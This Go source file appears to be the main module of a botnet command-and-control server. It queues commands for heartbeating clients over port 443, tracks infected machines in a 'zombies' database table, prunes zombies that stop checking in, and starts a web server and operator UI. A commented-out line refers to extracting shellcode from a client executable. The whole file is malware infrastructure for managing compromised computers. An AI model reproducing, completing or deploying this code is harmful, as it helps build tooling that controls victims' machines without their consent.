package main

import (
	"database/sql"
	"flag"
	"log"
	"strconv"
	"sync"
	"time"
)

// ////// COMMANDS QUEUE
var (
	commandQueue = make(map[string]*ResHeartBeat, 100)
	queueMutex   sync.Mutex
)

// //////////// WEB SERVER CONF ////////////
const PORT = ":443"

// ///////// CHECK CONNECTION AVAILABILITY

const MAX_AVAILABILITY_TIME = 60 //in sec
const CHECKING_DELAY = 10        // in sec

func checkZombiesAvailability(db *sql.DB) {
	logPrefix := "[ZMBICHECK] "
	for {
		removedClientNbr := 0
		DbgMsgEx(logPrefix+"Checking Zombies Availability", true)
		currentTimeStamp := time.Now()

		query := "SELECT LastConnTime FROM zombies WHERE 1"
		rows, err := db.Query(query)
		if err != nil {
			log.Fatal(err)
		}

		for rows.Next() {

			var lastConnTime time.Time
			var rawTimeStamp sql.NullString
			if err := rows.Scan(&rawTimeStamp); err != nil {
				Error(logPrefix + "(LasConnTime) Error while scanning data")
			}

			//DbgMsgEx( "RawTimeStamp: "+rawTimeStamp.String, true)

			if rawTimeStamp.Valid {
				lastConnTime, err = time.Parse("2006-01-02 15:04:05", rawTimeStamp.String)
				if err != nil {
					Error(logPrefix + "Error parsing timestamp: " + err.Error())
					continue
				}
			}

			//DbgMsgEx( "Found timestamp: "+lastConnTime.Format("2006-01-02 15:04:05"), true)
			//DbgMsgEx( "Unix timestamp lastconntime: "+strconv.FormatInt(lastConnTime.Unix(), 10), true)
			if currentTimeStamp.Unix()-lastConnTime.Unix() > MAX_AVAILABILITY_TIME {
				removedClientNbr++
				query1 := "DELETE FROM zombies WHERE lastConnTime = ?"
				rows1, err := db.Query(query1, lastConnTime)
				if err != nil {
					log.Fatal(err)
				}

				rows1.Close()
			}
		}

		if err := rows.Err(); err != nil {
			Error(logPrefix + "Error while iterating rows")
		}
		rows.Close()
		DbgMsgEx(logPrefix+strconv.Itoa(removedClientNbr)+" zombies deleted", true)
		time.Sleep(CHECKING_DELAY * time.Second)
	}

}

var verbose *bool

func main() {

	/*extractShellCode("client.exe")*/

	verbose = flag.Bool("v", false, "Enable verbosity")
	flag.BoolVar(verbose, "verbose", false, "Enable verbosity")
	flag.Parse()
	db, dBerr := InitDb()
	if dBerr != nil {
		Error("Error while starting DB: " + dBerr.Error())
	}

	defer db.Close()

	go func() {

		if *verbose {
			Log("[ARGS] Verbosity enabled")
		}

		InitCommands()
		go checkZombiesAvailability(db)
		//go UserInput(reader, db)
		// TODO: GOROUTINE TO CHECK SIDs EXPIRATIONS AND PROCESS THEM
		go StartWebServer(db)
	}()
	StartUI(db)

	//StartWebServer(db)

}
